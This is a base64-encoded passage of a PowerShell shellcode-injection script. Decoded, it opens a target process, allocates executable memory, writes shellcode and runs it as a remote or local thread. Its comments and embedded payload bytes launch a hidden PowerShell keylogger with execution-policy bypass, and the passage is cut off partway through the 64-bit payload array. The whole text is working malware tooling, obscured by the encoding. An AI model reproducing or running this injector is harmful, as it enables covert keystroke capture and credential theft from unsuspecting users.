AgICAgICAgICAgICAgIyBQVVNIICBCWVRFIDAKICAgICAgICAgICAgJENhbGxTdHViICs9IDB4QjggICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICMgTU9WICAgRFdPUkQgRUFYLCAmRXhpdFRocmVhZAogICAgICAgICAgICAkQ2FsbFN0dWIgKz0gQ29udmVydFRvLUxpdHRsZUVuZGlhbiAkRXhpdFRocmVhZEFkZHIgIyAmRXhpdFRocmVhZAogICAgICAgICAgICAkQ2FsbFN0dWIgKz0gMHhGRiwweEQwICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIyBDQUxMICBFQVgKICAgICAgICB9CiAgICAgICAgCiAgICAgICAgV3JpdGUtT3V0cHV0ICRDYWxsU3R1YgogICAgfQoKICAgIGZ1bmN0aW9uIExvY2FsOkluamVjdC1SZW1vdGVTaGVsbGNvZGUgKFtJbnRdICRQcm9jZXNzSUQpCiAgICB7CiAgICAgICAgIyBPcGVuIGEgaGFuZGxlIHRvIHRoZSBwcm9jZXNzIHlvdSB3YW50IHRvIGluamVjdCBpbnRvCiAgICAgICAgJGhQcm9jZXNzID0gJE9wZW5Qcm9jZXNzLkludm9rZSgweDAwMUYwRkZGLCAkZmFsc2UsICRQcm9jZXNzSUQpICMgUHJvY2Vzc0FjY2Vzc0ZsYWdzLkFsbCAoMHgwMDFGMEZGRikKICAgICAgICAKICAgICAgICBpZiAoISRoUHJvY2VzcykKICAgICAgICB7CiAgICAgICAgICAgIFRocm93ICJVbmFibGUgdG8gb3BlbiBhIHByb2Nlc3MgaGFuZGxlIGZvciBQSUQ6ICRQcm9jZXNzSUQiCiAgICAgICAgfQoKICAgICAgICAkSXNXb3c2NCA9ICRmYWxzZQoKICAgICAgICBpZiAoJDY0Yml0T1MpICMgT25seSBwZXJmb3JtIHRoZXNlcyBjaGVja3MgaWYgQ1BVIGlzIDY0LWJpdAogICAgICAgIHsKICAgICAgICAgICAgIyBEZXRlcm1pbmUgaWYgdGhlIHByb2Nlc3Mgc3BlY2lmaWVkIGlzIDMyIG9yIDY0IGJpdAogICAgICAgICAgICAkSXNXb3c2NFByb2Nlc3MuSW52b2tlKCRoUHJvY2VzcywgW1JlZl0gJElzV293NjQpIHwgT3V0LU51bGwKICAgICAgICAgICAgCiAgICAgICAgICAgIGlmICgoISRJc1dvdzY0KSAtYW5kICRQb3dlclNoZWxsMzJiaXQpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIFRocm93ICdTaGVsbGNvZGUgaW5qZWN0aW9uIHRhcmdldGluZyBhIDY0LWJpdCBwcm9jZXNzIGZyb20gMzItYml0IFBvd2VyU2hlbGwgaXMgbm90IHN1cHBvcnRlZC4gVXNlIHRoZSA2NC1iaXQgdmVyc2lvbiBvZiBQb3dlcnNoZWxsIGlmIHlvdSB3YW50IHRoaXMgdG8gd29yay4nCiAgICAgICAgICAgIH0KICAgICAgICAgICAgZWxzZWlmICgkSXNXb3c2NCkgIyAzMi1iaXQgV293NjQgcHJvY2VzcwogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBpZiAoJFNoZWxsY29kZTMyLkxlbmd0aCAtZXEgMCkKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICBUaHJvdyAnTm8gc2hlbGxjb2RlIHdhcyBwbGFjZWQgaW4gdGhlICRTaGVsbGNvZGUzMiB2YXJpYWJsZSEnCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICRTaGVsbGNvZGUgPSAkU2hlbGxjb2RlMzIKICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgJ0luamVjdGluZyBpbnRvIGEgV293NjQgcHJvY2Vzcy4nCiAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICdVc2luZyAzMi1iaXQgc2hlbGxjb2RlLicKICAgICAgICAgICAgfQogICAgICAgICAgICBlbHNlICMgNjQtYml0IHByb2Nlc3MKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgaWYgKCRTaGVsbGNvZGU2NC5MZW5ndGggLWVxIDApCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgVGhyb3cgJ05vIHNoZWxsY29kZSB3YXMgcGxhY2VkIGluIHRoZSAkU2hlbGxjb2RlNjQgdmFyaWFibGUhJwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAkU2hlbGxjb2RlID0gJFNoZWxsY29kZTY0CiAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICdVc2luZyA2NC1iaXQgc2hlbGxjb2RlLicKICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICBlbHNlICMgMzItYml0IENQVQogICAgICAgIHsKICAgICAgICAgICAgaWYgKCRTaGVsbGNvZGUzMi5MZW5ndGggLWVxIDApCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIFRocm93ICdObyBzaGVsbGNvZGUgd2FzIHBsYWNlZCBpbiB0aGUgJFNoZWxsY29kZTMyIHZhcmlhYmxlIScKICAgICAgICAgICAgfQogICAgICAgICAgICAKICAgICAgICAgICAgJFNoZWxsY29kZSA9ICRTaGVsbGNvZGUzMgogICAgICAgICAgICBXcml0ZS1WZXJib3NlICdVc2luZyAzMi1iaXQgc2hlbGxjb2RlLicKICAgICAgICB9CgogICAgICAgICMgUmVzZXJ2ZSBhbmQgY29tbWl0IGVub3VnaCBtZW1vcnkgaW4gcmVtb3RlIHByb2Nlc3MgdG8gaG9sZCB0aGUgc2hlbGxjb2RlCiAgICAgICAgJFJlbW90ZU1lbUFkZHIgPSAkVmlydHVhbEFsbG9jRXguSW52b2tlKCRoUHJvY2VzcywgW0ludFB0cl06Olplcm8sICRTaGVsbGNvZGUuTGVuZ3RoICsgMSwgMHgzMDAwLCAweDQwKSAjIChSZXNlcnZlfENvbW1pdCwgUldYKQogICAgICAgIAogICAgICAgIGlmICghJFJlbW90ZU1lbUFkZHIpCiAgICAgICAgewogICAgICAgICAgICBUaHJvdyAiVW5hYmxlIHRvIGFsbG9jYXRlIHNoZWxsY29kZSBtZW1vcnkgaW4gUElEOiAkUHJvY2Vzc0lEIgogICAgICAgIH0KICAgICAgICAKICAgICAgICBXcml0ZS1WZXJib3NlICJTaGVsbGNvZGUgbWVtb3J5IHJlc2VydmVkIGF0IDB4JCgkUmVtb3RlTWVtQWRkci5Ub1N0cmluZygiWCQoW0ludFB0cl06OlNpemUqMikiKSkiCgogICAgICAgICMgQ29weSBzaGVsbGNvZGUgaW50byB0aGUgcHJldmlvdXNseSBhbGxvY2F0ZWQgbWVtb3J5CiAgICAgICAgJFdyaXRlUHJvY2Vzc01lbW9yeS5JbnZva2UoJGhQcm9jZXNzLCAkUmVtb3RlTWVtQWRkciwgJFNoZWxsY29kZSwgJFNoZWxsY29kZS5MZW5ndGgsIFtSZWZdIDApIHwgT3V0LU51bGwKCiAgICAgICAgIyBHZXQgYWRkcmVzcyBvZiBFeGl0VGhyZWFkIGZ1bmN0aW9uCiAgICAgICAgJEV4aXRUaHJlYWRBZGRyID0gR2V0LVByb2NBZGRyZXNzIGtlcm5lbDMyLmRsbCBFeGl0VGhyZWFkCgogICAgICAgIGlmICgkSXNXb3c2NCkKICAgICAgICB7CiAgICAgICAgICAgICMgQnVpbGQgMzItYml0IGlubGluZSBhc3NlbWJseSBzdHViIHRvIGNhbGwgdGhlIHNoZWxsY29kZSB1cG9uIGNyZWF0aW9uIG9mIGEgcmVtb3RlIHRocmVhZC4KICAgICAgICAgICAgJENhbGxTdHViID0gRW1pdC1DYWxsVGhyZWFkU3R1YiAkUmVtb3RlTWVtQWRkciAkRXhpdFRocmVhZEFkZHIgMzIKICAgICAgICAgICAgCiAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgJ0VtaXR0aW5nIDMyLWJpdCBhc3NlbWJseSBjYWxsIHN0dWIuJwogICAgICAgIH0KICAgICAgICBlbHNlCiAgICAgICAgewogICAgICAgICAgICAjIEJ1aWxkIDY0LWJpdCBpbmxpbmUgYXNzZW1ibHkgc3R1YiB0byBjYWxsIHRoZSBzaGVsbGNvZGUgdXBvbiBjcmVhdGlvbiBvZiBhIHJlbW90ZSB0aHJlYWQuCiAgICAgICAgICAgICRDYWxsU3R1YiA9IEVtaXQtQ2FsbFRocmVhZFN0dWIgJFJlbW90ZU1lbUFkZHIgJEV4aXRUaHJlYWRBZGRyIDY0CiAgICAgICAgICAgIAogICAgICAgICAgICBXcml0ZS1WZXJib3NlICdFbWl0dGluZyA2NC1iaXQgYXNzZW1ibHkgY2FsbCBzdHViLicKICAgICAgICB9CgogICAgICAgICMgQWxsb2NhdGUgaW5saW5lIGFzc2VtYmx5IHN0dWIKICAgICAgICAkUmVtb3RlU3R1YkFkZHIgPSAkVmlydHVhbEFsbG9jRXguSW52b2tlKCRoUHJvY2VzcywgW0ludFB0cl06Olplcm8sICRDYWxsU3R1Yi5MZW5ndGgsIDB4MzAwMCwgMHg0MCkgIyAoUmVzZXJ2ZXxDb21taXQsIFJXWCkKICAgICAgICAKICAgICAgICBpZiAoISRSZW1vdGVTdHViQWRkcikKICAgICAgICB7CiAgICAgICAgICAgIFRocm93ICJVbmFibGUgdG8gYWxsb2NhdGUgdGhyZWFkIGNhbGwgc3R1YiBtZW1vcnkgaW4gUElEOiAkUHJvY2Vzc0lEIgogICAgICAgIH0KICAgICAgICAKICAgICAgICBXcml0ZS1WZXJib3NlICJUaHJlYWQgY2FsbCBzdHViIG1lbW9yeSByZXNlcnZlZCBhdCAweCQoJFJlbW90ZVN0dWJBZGRyLlRvU3RyaW5nKCJYJChbSW50UHRyXTo6U2l6ZSoyKSIpKSIKCiAgICAgICAgIyBXcml0ZSAzMi1iaXQgYXNzZW1ibHkgc3R1YiB0byByZW1vdGUgcHJvY2VzcyBtZW1vcnkgc3BhY2UKICAgICAgICAkV3JpdGVQcm9jZXNzTWVtb3J5Lkludm9rZSgkaFByb2Nlc3MsICRSZW1vdGVTdHViQWRkciwgJENhbGxTdHViLCAkQ2FsbFN0dWIuTGVuZ3RoLCBbUmVmXSAwKSB8IE91dC1OdWxsCgogICAgICAgICMgRXhlY3V0ZSBzaGVsbGNvZGUgYXMgYSByZW1vdGUgdGhyZWFkCiAgICAgICAgJFRocmVhZEhhbmRsZSA9ICRDcmVhdGVSZW1vdGVUaHJlYWQuSW52b2tlKCRoUHJvY2VzcywgW0ludFB0cl06Olplcm8sIDAsICRSZW1vdGVTdHViQWRkciwgJFJlbW90ZU1lbUFkZHIsIDAsIFtJbnRQdHJdOjpaZXJvKQogICAgICAgIAogICAgICAgIGlmICghJFRocmVhZEhhbmRsZSkKICAgICAgICB7CiAgICAgICAgICAgIFRocm93ICJVbmFibGUgdG8gbGF1bmNoIHJlbW90ZSB0aHJlYWQgaW4gUElEOiAkUHJvY2Vzc0lEIgogICAgICAgIH0KCiAgICAgICAgIyBDbG9zZSBwcm9jZXNzIGhhbmRsZQogICAgICAgICRDbG9zZUhhbmRsZS5JbnZva2UoJGhQcm9jZXNzKSB8IE91dC1OdWxsCgogICAgICAgIFdyaXRlLVZlcmJvc2UgJ1NoZWxsY29kZSBpbmplY3Rpb24gY29tcGxldGUhJwogICAgfQoKICAgIGZ1bmN0aW9uIExvY2FsOkluamVjdC1Mb2NhbFNoZWxsY29kZQogICAgewogICAgICAgIGlmICgkUG93ZXJTaGVsbDMyYml0KSB7CiAgICAgICAgICAgIGlmICgkU2hlbGxjb2RlMzIuTGVuZ3RoIC1lcSAwKQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBUaHJvdyAnTm8gc2hlbGxjb2RlIHdhcyBwbGFjZWQgaW4gdGhlICRTaGVsbGNvZGUzMiB2YXJpYWJsZSEnCiAgICAgICAgICAgICAgICByZXR1cm4KICAgICAgICAgICAgfQogICAgICAgICAgICAKICAgICAgICAgICAgJFNoZWxsY29kZSA9ICRTaGVsbGNvZGUzMgogICAgICAgICAgICBXcml0ZS1WZXJib3NlICdVc2luZyAzMi1iaXQgc2hlbGxjb2RlLicKICAgICAgICB9CiAgICAgICAgZWxzZQogICAgICAgIHsKICAgICAgICAgICAgaWYgKCRTaGVsbGNvZGU2NC5MZW5ndGggLWVxIDApCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIFRocm93ICdObyBzaGVsbGNvZGUgd2FzIHBsYWNlZCBpbiB0aGUgJFNoZWxsY29kZTY0IHZhcmlhYmxlIScKICAgICAgICAgICAgICAgIHJldHVybgogICAgICAgICAgICB9CiAgICAgICAgICAgIAogICAgICAgICAgICAkU2hlbGxjb2RlID0gJFNoZWxsY29kZTY0CiAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgJ1VzaW5nIDY0LWJpdCBzaGVsbGNvZGUuJwogICAgICAgIH0KICAgIAogICAgICAgICMgQWxsb2NhdGUgUldYIG1lbW9yeSBmb3IgdGhlIHNoZWxsY29kZQogICAgICAgICRCYXNlQWRkcmVzcyA9ICRWaXJ0dWFsQWxsb2MuSW52b2tlKFtJbnRQdHJdOjpaZXJvLCAkU2hlbGxjb2RlLkxlbmd0aCArIDEsIDB4MzAwMCwgMHg0MCkgIyAoUmVzZXJ2ZXxDb21taXQsIFJXWCkKICAgICAgICBpZiAoISRCYXNlQWRkcmVzcykKICAgICAgICB7CiAgICAgICAgICAgIFRocm93ICJVbmFibGUgdG8gYWxsb2NhdGUgc2hlbGxjb2RlIG1lbW9yeSBpbiBQSUQ6ICRQcm9jZXNzSUQiCiAgICAgICAgfQogICAgICAgIAogICAgICAgIFdyaXRlLVZlcmJvc2UgIlNoZWxsY29kZSBtZW1vcnkgcmVzZXJ2ZWQgYXQgMHgkKCRCYXNlQWRkcmVzcy5Ub1N0cmluZygiWCQoW0ludFB0cl06OlNpemUqMikiKSkiCgogICAgICAgICMgQ29weSBzaGVsbGNvZGUgdG8gUldYIGJ1ZmZlcgogICAgICAgIFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkNvcHkoJFNoZWxsY29kZSwgMCwgJEJhc2VBZGRyZXNzLCAkU2hlbGxjb2RlLkxlbmd0aCkKICAgICAgICAKICAgICAgICAjIEdldCBhZGRyZXNzIG9mIEV4aXRUaHJlYWQgZnVuY3Rpb24KICAgICAgICAkRXhpdFRocmVhZEFkZHIgPSBHZXQtUHJvY0FkZHJlc3Mga2VybmVsMzIuZGxsIEV4aXRUaHJlYWQKICAgICAgICAKICAgICAgICBpZiAoJFBvd2VyU2hlbGwzMmJpdCkKICAgICAgICB7CiAgICAgICAgICAgICRDYWxsU3R1YiA9IEVtaXQtQ2FsbFRocmVhZFN0dWIgJEJhc2VBZGRyZXNzICRFeGl0VGhyZWFkQWRkciAzMgogICAgICAgICAgICAKICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAnRW1pdHRpbmcgMzItYml0IGFzc2VtYmx5IGNhbGwgc3R1Yi4nCiAgICAgICAgfQogICAgICAgIGVsc2UKICAgICAgICB7CiAgICAgICAgICAgICRDYWxsU3R1YiA9IEVtaXQtQ2FsbFRocmVhZFN0dWIgJEJhc2VBZGRyZXNzICRFeGl0VGhyZWFkQWRkciA2NAogICAgICAgICAgICAKICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAnRW1pdHRpbmcgNjQtYml0IGFzc2VtYmx5IGNhbGwgc3R1Yi4nCiAgICAgICAgfQoKICAgICAgICAjIEFsbG9jYXRlIFJXWCBtZW1vcnkgZm9yIHRoZSB0aHJlYWQgY2FsbCBzdHViCiAgICAgICAgJENhbGxTdHViQWRkcmVzcyA9ICRWaXJ0dWFsQWxsb2MuSW52b2tlKFtJbnRQdHJdOjpaZXJvLCAkQ2FsbFN0dWIuTGVuZ3RoICsgMSwgMHgzMDAwLCAweDQwKSAjIChSZXNlcnZlfENvbW1pdCwgUldYKQogICAgICAgIGlmICghJENhbGxTdHViQWRkcmVzcykKICAgICAgICB7CiAgICAgICAgICAgIFRocm93ICJVbmFibGUgdG8gYWxsb2NhdGUgdGhyZWFkIGNhbGwgc3R1Yi4iCiAgICAgICAgfQogICAgICAgIAogICAgICAgIFdyaXRlLVZlcmJvc2UgIlRocmVhZCBjYWxsIHN0dWIgbWVtb3J5IHJlc2VydmVkIGF0IDB4JCgkQ2FsbFN0dWJBZGRyZXNzLlRvU3RyaW5nKCJYJChbSW50UHRyXTo6U2l6ZSoyKSIpKSIKCiAgICAgICAgIyBDb3B5IGNhbGwgc3R1YiB0byBSV1ggYnVmZmVyCiAgICAgICAgW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6Q29weSgkQ2FsbFN0dWIsIDAsICRDYWxsU3R1YkFkZHJlc3MsICRDYWxsU3R1Yi5MZW5ndGgpCgogICAgICAgICMgTGF1bmNoIHNoZWxsY29kZSBpbiBpdCdzIG93biB0aHJlYWQKICAgICAgICAkVGhyZWFkSGFuZGxlID0gJENyZWF0ZVRocmVhZC5JbnZva2UoW0ludFB0cl06Olplcm8sIDAsICRDYWxsU3R1YkFkZHJlc3MsICRCYXNlQWRkcmVzcywgMCwgW0ludFB0cl06Olplcm8pCiAgICAgICAgaWYgKCEkVGhyZWFkSGFuZGxlKQogICAgICAgIHsKICAgICAgICAgICAgVGhyb3cgIlVuYWJsZSB0byBsYXVuY2ggdGhyZWFkLiIKICAgICAgICB9CgogICAgICAgICMgV2FpdCBmb3Igc2hlbGxjb2RlIHRocmVhZCB0byB0ZXJtaW5hdGUKICAgICAgICAkV2FpdEZvclNpbmdsZU9iamVjdC5JbnZva2UoJFRocmVhZEhhbmRsZSwgMHhGRkZGRkZGRikgfCBPdXQtTnVsbAogICAgICAgIAogICAgICAgICRWaXJ0dWFsRnJlZS5JbnZva2UoJENhbGxTdHViQWRkcmVzcywgJENhbGxTdHViLkxlbmd0aCArIDEsIDB4ODAwMCkgfCBPdXQtTnVsbCAjIE1FTV9SRUxFQVNFICgweDgwMDApCiAgICAgICAgJFZpcnR1YWxGcmVlLkludm9rZSgkQmFzZUFkZHJlc3MsICRTaGVsbGNvZGUuTGVuZ3RoICsgMSwgMHg4MDAwKSB8IE91dC1OdWxsICMgTUVNX1JFTEVBU0UgKDB4ODAwMCkKCiAgICAgICAgV3JpdGUtVmVyYm9zZSAnU2hlbGxjb2RlIGluamVjdGlvbiBjb21wbGV0ZSEnCiAgICB9CgogICAgIyBBIHZhbGlkIHBvaW50ZXIgdG8gSXNXb3c2NFByb2Nlc3Mgd2lsbCBiZSByZXR1cm5lZCBpZiBDUFUgaXMgNjQtYml0CiAgICAkSXNXb3c2NFByb2Nlc3NBZGRyID0gR2V0LVByb2NBZGRyZXNzIGtlcm5lbDMyLmRsbCBJc1dvdzY0UHJvY2VzcwoKICAgICRBZGRyZXNzV2lkdGggPSAkbnVsbAoKICAgIHRyeSB7CiAgICAgICAgJEFkZHJlc3NXaWR0aCA9IEAoR2V0LVdtaU9iamVjdCAtUXVlcnkgJ1NFTEVDVCBBZGRyZXNzV2lkdGggRlJPTSBXaW4zMl9Qcm9jZXNzb3InKVswXSB8IFNlbGVjdC1PYmplY3QgLUV4cGFuZFByb3BlcnR5IEFkZHJlc3NXaWR0aAogICAgfSBjYXRjaCB7CiAgICAgICAgdGhyb3cgJ1VuYWJsZSB0byBkZXRlcm1pbmUgT1MgcHJvY2Vzc29yIGFkZHJlc3Mgd2lkdGguJwogICAgfQoKICAgIHN3aXRjaCAoJEFkZHJlc3NXaWR0aCkgewogICAgICAgICczMicgewogICAgICAgICAgICAkNjRiaXRPUyA9ICRGYWxzZQogICAgICAgIH0KCiAgICAgICAgJzY0JyB7CiAgICAgICAgICAgICQ2NGJpdE9TID0gJFRydWUKCiAgICAgICAgICAgICRJc1dvdzY0UHJvY2Vzc0RlbGVnYXRlID0gR2V0LURlbGVnYXRlVHlwZSBAKFtJbnRQdHJdLCBbQm9vbF0uTWFrZUJ5UmVmVHlwZSgpKSAoW0Jvb2xdKQogICAgCSAgICAkSXNXb3c2NFByb2Nlc3MgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpHZXREZWxlZ2F0ZUZvckZ1bmN0aW9uUG9pbnRlcigkSXNXb3c2NFByb2Nlc3NBZGRyLCAkSXNXb3c2NFByb2Nlc3NEZWxlZ2F0ZSkKICAgICAgICB9CgogICAgICAgIGRlZmF1bHQgewogICAgICAgICAgICB0aHJvdyAnSW52YWxpZCBPUyBhZGRyZXNzIHdpZHRoIGRldGVjdGVkLicKICAgICAgICB9CiAgICB9CgogICAgaWYgKFtJbnRQdHJdOjpTaXplIC1lcSA0KQogICAgewogICAgICAgICRQb3dlclNoZWxsMzJiaXQgPSAkdHJ1ZQogICAgfQogICAgZWxzZQogICAgewogICAgICAgICRQb3dlclNoZWxsMzJiaXQgPSAkZmFsc2UKICAgIH0KCiAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydTaGVsbGNvZGUnXSkKICAgIHsKICAgICAgICAjIFVzZXJzIHBhc3NpbmcgaW4gc2hlbGxjb2RlICB0aHJvdWdoIHRoZSAnLVNoZWxsY29kZScgcGFyYW1ldGVyIGFyZSByZXNwb25zaWJsZSBmb3IgZW5zdXJpbmcgaXQgdGFyZ2V0cwogICAgICAgICMgdGhlIGNvcnJlY3QgYXJjaGl0ZWNodHVyZSAtIHg4NiB2cy4geDY0LiBUaGlzIHNjcmlwdCBoYXMgbm8gd2F5IHRvIHZhbGlkYXRlIHdoYXQgeW91IHByb3ZpZGUgaXQuCiAgICAgICAgW0J5dGVbXV0gJFNoZWxsY29kZTMyID0gJFNoZWxsY29kZQogICAgICAgIFtCeXRlW11dICRTaGVsbGNvZGU2NCA9ICRTaGVsbGNvZGUzMgogICAgfQogICAgZWxzZQogICAgewogICAgICAgICMgS2V5TG9nIEZvciBZT1UgLi4uIG9yIHdoYXRldmVyIHNoZWxsY29kZSB5b3UgZGVjaWRlIHRvIHBsYWNlIGluIGhlcmUKICAgICAgICAjIEluc2VydCB5b3VyIHNoZWxsY29kZSBoZXJlIGluIHRoZSBmb3IgMHhYWCwweFhYLC4uLgogICAgICAgICMgMzItYml0IHBheWxvYWQKICAgICAgICAjIG1zZnZlbm9tIC1wIHdpbmRvd3MvZXhlYyBDTUQ9InBvd2Vyc2hlbGwgLWV4ZWMgYnlwYXNzIEM6XEJlc3QtS2V5TG9nZ2VyLnBzMSIgRVhJVEZVTkM9dGhyZWFkIC1mIHBvd2Vyc2hlbGwKICAgICAgICBbQnl0ZVtdXSAkU2hlbGxjb2RlMzIgPSBAKDB4ZmMsMHhlOCwweDgyLDB4MCwweDAsMHgwLDB4NjAsMHg4OSwweGU1LDB4MzEsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHhjMCwweDY0LDB4OGIsMHg1MCwweDMwLDB4OGIsMHg1MiwweGMsMHg4YiwweDUyLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4MTQsMHg4YiwweDcyLDB4MjgsMHhmLDB4YjcsMHg0YSwweDI2LDB4MzEsMHhmZiwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAweGFjLDB4M2MsMHg2MSwweDdjLDB4MiwweDJjLDB4MjAsMHhjMSwweGNmLDB4ZCwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAweDEsMHhjNywweGUyLDB4ZjIsMHg1MiwweDU3LDB4OGIsMHg1MiwweDEwLDB4OGIsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHg0YSwweDNjLDB4OGIsMHg0YywweDExLDB4NzgsMHhlMywweDQ4LDB4MSwweGQxLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4NTEsMHg4YiwweDU5LDB4MjAsMHgxLDB4ZDMsMHg4YiwweDQ5LDB4MTgsMHhlMywKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAweDNhLDB4NDksMHg4YiwweDM0LDB4OGIsMHgxLDB4ZDYsMHgzMSwweGZmLDB4YWMsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHhjMSwweGNmLDB4ZCwweDEsMHhjNywweDM4LDB4ZTAsMHg3NSwweGY2LDB4MywKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAweDdkLDB4ZjgsMHgzYiwweDdkLDB4MjQsMHg3NSwweGU0LDB4NTgsMHg4YiwweDU4LAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4MjQsMHgxLDB4ZDMsMHg2NiwweDhiLDB4YywweDRiLDB4OGIsMHg1OCwweDFjLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4MSwweGQzLDB4OGIsMHg0LDB4OGIsMHgxLDB4ZDAsMHg4OSwweDQ0LDB4MjQsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHgyNCwweDViLDB4NWIsMHg2MSwweDU5LDB4NWEsMHg1MSwweGZmLDB4ZTAsMHg1ZiwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAweDVmLDB4NWEsMHg4YiwweDEyLDB4ZWIsMHg4ZCwweDVkLDB4NmEsMHgxLDB4OGQsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHg4NSwweGIyLDB4MCwweDAsMHgwLDB4NTAsMHg2OCwweDMxLDB4OGIsMHg2ZiwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAweDg3LDB4ZmYsMHhkNSwweGJiLDB4ZTAsMHgxZCwweDJhLDB4YSwweDY4LDB4YTYsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHg5NSwweGJkLDB4OWQsMHhmZiwweGQ1LDB4M2MsMHg2LDB4N2MsMHhhLDB4ODAsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHhmYiwweGUwLDB4NzUsMHg1LDB4YmIsMHg0NywweDEzLDB4NzIsMHg2ZiwweDZhLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4MCwweDUzLDB4ZmYsMHhkNSwweDUwLDB4NmYsMHg3NywweDY1LDB4NzIsMHg1MywKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAweDY4LDB4NjUsMHg2YywweDZjLDB4MjAsMHgyZCwweDc3LDB4NjksMHg2ZSwweDY0LAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4NmYsMHg3NywweDczLDB4NzQsMHg3OSwweDZjLDB4NjUsMHgyMCwweDY4LDB4NjksCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHg2NCwweDY0LDB4NjUsMHg2ZSwweDIwLDB4MmQsMHg2NSwweDc4LDB4NjUsMHg2MywKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAweDIwLDB4NjIsMHg3OSwweDcwLDB4NjEsMHg3MywweDczLDB4MjAsMHg0OSwweDZkLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4NzAsMHg2ZiwweDcyLDB4NzQsMHgyZCwweDRkLDB4NmYsMHg2NCwweDc1LDB4NmMsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHg2NSwweDIwLDB4NDMsMHgzYSwweDVjLDB4NTAsMHg3MiwweDY5LDB4NmUsMHg2MywKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAweDY1LDB4NTAsMHg2ZiwweDc3LDB4NjUsMHg3MiwweDJlLDB4NzAsMHg3MywweDZkLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4MzEsMHgyMCwweDNiLDB4MjAsMHg1MywweDc0LDB4NjEsMHg3MiwweDc0LDB4MmQsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHg0YiwweDY1LDB4NzksMHg0YywweDZmLDB4NjcsMHg2NywweDY1LDB4NzIsMHgwKQoKICAgICAgICAjIDY0LWJpdCBwYXlsb2FkCiAgICAgICAgIyBtc2Z2ZW5vbSAtcCB3aW5kb3dzL3g2NC9leGVjIENNRD0icG93ZXJzaGVsbCAtZXhlYyBieXBhc3MgQzpcQmVzdC1LZXlMb2dnZXIucHMxIiBFWElURlVOQz10aHJlYWQgLWYgcG93ZXJzaGVsbAogICAgICAgIFtCeXRlW11dICRTaGVsbGNvZGU2NCA9IEAoMHhmYywweDQ4LDB4ODMsMHhlNCwweGYwLDB4ZTgsMHhjMCwweDAsMHgwLDB4MCwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAweDQxLDB4NTEsMHg0MSwweDUwLDB4NTIsMHg1MSwweDU2LDB4NDgsMHgzMSwweGQyLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4NjUsMHg0OCwweDhiLDB4NTIsMHg2MCwweDQ4LDB4OGIsMHg1MiwweDE4LDB4NDgsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHg4YiwweDUyLDB4MjAsMHg0OCwweDhiLDB4NzIsMHg1MCwweDQ4LDB4ZiwweGI3LAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4NGEsMHg0YSwweDRkLDB4MzEsMHhjOSwweDQ4LDB4MzEsMHhjMCwweGFjLDB4M2MsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHg2MSwweDdjLDB4MiwweDJjLDB4MjAsMHg0MSwweGMxLDB4YzksMHhkLDB4NDEsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHgxLDB4YzEsMHhlMiwweGVkLDB4NTIsMHg0MSwweDUxLDB4NDgsMHg4YiwweDUyLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4MjAsMHg4YiwweDQyLDB4M2MsMHg0OCwweDEsMHhkMCwwe